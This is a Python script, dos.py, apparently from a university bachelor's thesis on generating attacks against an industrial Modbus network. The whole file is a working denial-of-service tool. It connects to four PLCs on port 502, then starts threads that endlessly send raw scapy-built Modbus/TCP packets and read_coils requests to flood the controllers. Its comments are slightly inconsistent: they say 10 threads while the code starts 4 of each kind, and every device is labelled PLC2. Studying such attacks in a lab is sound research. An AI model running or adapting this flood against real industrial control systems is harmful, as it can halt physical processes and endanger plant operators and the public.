# Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
# File name: dos.py 
# Authors: Jakub Kuzník <xkuzni04>
# institution: VUT FIT 
# Description:.

from scapy.all import * 
from pyModbusTCP.client import ModbusClient
import threading

ATTACKER_IP = "192.168.88.199"

# Device that i am attacking 
SLAVE1 = "192.168.88.251"  # PLC2
SLAVE2 = "192.168.88.252"  # PLC2
SLAVE3 = "192.168.88.253"  # PLC2
SLAVE4 = "192.168.88.254"  # PLC2

SERVER_PORT = 502

THREADS_VALID_PACKETS = 4
THREADS_INVALID_PACKETS = 4

# establish tcp connection with device 
plc1 = ModbusClient(host=SLAVE1, port=SERVER_PORT)
plc1.open()
plc2 = ModbusClient(host=SLAVE2, port=SERVER_PORT)
plc2.open()
plc3 = ModbusClient(host=SLAVE3, port=SERVER_PORT)
plc3.open()
plc4 = ModbusClient(host=SLAVE4, port=SERVER_PORT)
plc4.open()

#while True:

# Define source and destination IP addresses
src_ip = "192.168.88.199"
dst_ip = "192.168.88.251"

def build_packet(src_ip, dst_ip):
  trans_id = 0x8345
  protocol_id = 0x0000
  length = 0x0006
  unit_id = 0x01
  function_code = 0x01
  start_address = 0x0000
  quantity = 0x0001
  
  modbus_payload = struct.pack(">HHHBBHH", trans_id, protocol_id, length, unit_id, function_code, start_address, quantity)
  # Create IP and TCP headers
  ip_header = IP(src=src_ip, dst=dst_ip)
  tcp_header = TCP(dport=502)

  # Create Modbus/TCP packet
  modbus_packet = ip_header / tcp_header / modbus_payload

  # Set the packet length
  modbus_packet.len = len(modbus_packet)
  
  return modbus_packet


def send_packet_in_thread_invalid():
  while True:
    modbus_packet1 = build_packet(ATTACKER_IP, SLAVE1)
    modbus_packet2 = build_packet(ATTACKER_IP, SLAVE2)
    modbus_packet3 = build_packet(ATTACKER_IP, SLAVE3)
    modbus_packet4 = build_packet(ATTACKER_IP, SLAVE4)
    send(modbus_packet1)
    send(modbus_packet2)
    send(modbus_packet3)
    send(modbus_packet4)

def send_packet_in_thread_valid():
  while True:
    plc1.read_coils(4,4)
    plc2.read_coils(4,4)
    plc3.read_coils(4,4)
    plc4.read_coils(4,4)

# Create 10 threads to send packets
for i in range(THREADS_INVALID_PACKETS):
    thread = threading.Thread(target=send_packet_in_thread_invalid, args=())
    thread.start()

# Create 10 threads to send packets
for i in range(THREADS_VALID_PACKETS):
    thread = threading.Thread(target=send_packet_in_thread_valid, args=())
    thread.start()
